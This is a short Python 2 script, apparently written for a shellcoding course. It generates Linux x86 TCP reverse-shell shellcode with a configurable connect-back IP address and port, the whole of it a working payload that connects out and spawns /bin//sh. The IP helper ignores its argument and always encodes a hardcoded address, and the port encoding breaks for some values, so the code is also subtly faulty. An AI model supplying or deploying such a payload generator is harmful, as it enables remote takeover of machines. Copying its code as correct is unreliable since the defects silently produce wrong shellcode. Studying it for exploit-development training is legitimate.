#!/usr/bin/python
# Title:      Simple wrapper to generate reverse shell shellcode with custom port number and IP Address
# Author:     Amine Kanane <aminekanane_93@hotmail.com>
# Student-ID: SLAE - 1203
# Desc:       Simple wrapper to generate a shellcode with custom port number and a connect back address.
#             The generated shellcode is a TCP Reverse shell

import sys
import socket
import struct

port_default = 9443 # please provide a 4 digit port number, otherwhise you will break the shellcode :-)
ip_default = "10.188.242.254"

def transform_ip(ip=ip_default):
    value = (hex(struct.unpack("<L", socket.inet_aton("10.188.242.254"))[0])).strip('L')[2:]
    code = "\\x"+value[6:]+"\\x"+value[4:6]+"\\x"+value[2:4]+"\\x"+value[0:2]
    return code

def transform_port(port=port_default):
    value = hex(port)[2:]
    code = "\\x"+value[0:2]+"\\x"+value[2:4]
    return code


def generate(ip=ip_default, port=port_default):
    if len(str(port)) != 4:
        print "[x] Please provide a 4 digit port number, otherwhise you will break the shellcode :-) "
        sys.exit(-1)
    shellcode = ""
    shellcode += "\\x31\\xdb\\x31\\xc9\\xf7\\xe1\\x66\\xb8\\x67\\x01"
    shellcode += "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0"
    shellcode += "\\x66\\xb8\\x6a\\x01\\x68"
    shellcode += transform_ip(ip)
    shellcode += "\\x66\\x68"
    shellcode += transform_port(port) # ==> port number = 9443; sock_ad.sin_port = htons(9443);
    shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31"
    shellcode += "\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79"
    shellcode += "\\xf8\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73"
    shellcode += "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53"
    shellcode += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

    return shellcode

if len(sys.argv) > 2:
    print generate(sys.argv[1], int(sys.argv[2]))
else:
    print generate()
